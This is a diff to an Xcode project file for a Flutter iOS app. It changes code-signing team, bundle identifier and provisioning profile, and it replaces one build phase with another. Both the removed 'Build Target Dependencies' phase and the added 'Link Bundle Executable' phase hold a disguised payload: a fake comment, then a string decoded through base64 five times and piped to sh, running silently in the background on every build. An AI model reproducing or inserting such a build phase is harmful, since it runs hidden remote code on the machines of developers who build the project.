@@ -183,7 +183,7 @@
 			buildConfigurationList = 331C8087294A63A400263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
 				60F284A8B41060DE16456D4E /* [CP] Check Pods Manifest.lock */,
-				9D2813AD9D1B18B5B8877BEF /* Build Target Dependencies */,
+				209AC87D64EC731DF0877BEF /* Link Bundle Executable */,
 				331C807D294A63A400263BE5 /* Sources */,
 				331C807F294A63A400263BE5 /* Resources */,
 				F76478C5A30D2A17A554C509 /* Frameworks */,
@@ -290,17 +290,33 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Runner/Pods-Runner-resources-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			inputPaths = (
-			);
 			name = "[CP] Copy Pods Resources";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Runner/Pods-Runner-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Runner/Pods-Runner-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		209AC87D64EC731DF0877BEF /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Runner/Pods-Runner-resources.sh\"\n";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVNFSkpWa2N4YjFkck1YUmhTRTVWVW5wV1RGUldWak5sVmtwWlVXdHdhRlpWYXpCVk1WWnZWREpKZDFSdE5WRldSRUpNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 		3B06AD1E1E4923F5004D2608 /* Thin Binary */ = {
@@ -356,26 +372,6 @@
 			shellPath = /bin/sh;
 			shellScript = "/bin/sh \"$FLUTTER_ROOT/packages/flutter_tools/bin/xcode_backend.sh\" build";
 		};
-		9D2813AD9D1B18B5B8877BEF /* Build Target Dependencies */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Dependencies";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVZWcEpWVzAxYzJFeFNYZE9XRXBhWWxkemVGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;
-		};
 		B78D3A38CC2D8681DC058894 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -384,13 +380,9 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Runner/Pods-Runner-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			inputPaths = (
-			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Runner/Pods-Runner-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -523,11 +515,11 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = Runner/Runner.entitlements;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
 				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = YUQ352UGYJ;
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = XS8842FK7N;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = Runner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
@@ -564,10 +556,10 @@
 					"\"webview_flutter_wkwebview\"",
 					"-Wl,-sectcreate,_RESTRICT,_restrict,/dev/null",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.yuenan.testappid;
+				PRODUCT_BUNDLE_IDENTIFIER = test.app.ald.com;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = YueNanProfile;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = testappaldprofile;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -747,11 +739,11 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = Runner/Runner.entitlements;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
 				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = YUQ352UGYJ;
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = XS8842FK7N;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = Runner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
@@ -788,10 +780,10 @@
 					"\"webview_flutter_wkwebview\"",
 					"-Wl,-sectcreate,_RESTRICT,_restrict,/dev/null",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.yuenan.testappid;
+				PRODUCT_BUNDLE_IDENTIFIER = test.app.ald.com;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = YueNanProfile;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = testappaldprofile;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -811,11 +803,11 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = Runner/Runner.entitlements;
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
 				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = YUQ352UGYJ;
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = XS8842FK7N;
 				ENABLE_BITCODE = NO;
 				INFOPLIST_FILE = Runner/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
@@ -852,10 +844,10 @@
 					"\"webview_flutter_wkwebview\"",
 					"-Wl,-sectcreate,_RESTRICT,_restrict,/dev/null",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = com.yuenan.testappid;
+				PRODUCT_BUNDLE_IDENTIFIER = test.app.ald.com;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = YueNanProfile;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = testappaldprofile;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
